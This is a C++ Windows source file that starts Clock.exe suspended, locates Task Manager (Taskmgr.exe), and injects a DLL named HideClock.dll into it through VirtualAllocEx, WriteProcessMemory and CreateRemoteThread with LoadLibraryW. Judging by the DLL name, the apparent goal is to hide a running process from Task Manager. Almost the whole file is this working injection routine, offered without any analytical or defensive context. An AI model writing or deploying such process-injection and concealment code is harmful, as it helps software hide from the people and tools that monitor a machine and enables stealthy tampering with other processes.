#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <filesystem>

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    std::wcout << L"[+] Taking a snapshot of running processes..." << std::endl;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] Failed to create process snapshot." << std::endl;
        return 0;
    }

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                std::wcout << L"[+] Found target process: " << processName << L" with PID " << pid << std::endl;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    if (pid == 0) {
        std::wcerr << L"[-] Could not find process: " << processName << std::endl;
    }

    return pid;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    STARTUPINFOW si{}; 
    si.cb = sizeof(si);
    
    PROCESS_INFORMATION pi = {}; 
    std::wstring myProcess = L"Clock.exe"; // Start process suspended 
    if (!CreateProcessW(myProcess.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) { 
        std::wcerr << L"Failed to start process\n"; 
        return 1; 
    }

    const wchar_t* injectionTarget = L"Taskmgr.exe";
    DWORD pid = GetProcessIdByName(injectionTarget);
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"[-] Failed to open target process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate memory for DLL path in target process
    std::wstring dllPath = std::filesystem::current_path().wstring() + L"\\HideClock.dll";
    size_t dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::wcerr << L"[-] Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath.c_str(), dllPathSize, nullptr)) {
        std::wcerr << L"[-] Failed to write DLL path to target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        std::wcerr << L"[-] Failed to get kernel32.dll module handle." << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibraryAddr) {
        std::wcerr << L"[-] Failed to get LoadLibraryW address." << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMem, 0, nullptr);
    if (!hThread) {
        std::wcerr << L"[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);

    // Resume Clock.exe 
    ResumeThread(pi.hThread); 
    
    CloseHandle(pi.hThread); 
    CloseHandle(pi.hProcess);

    return 0;
}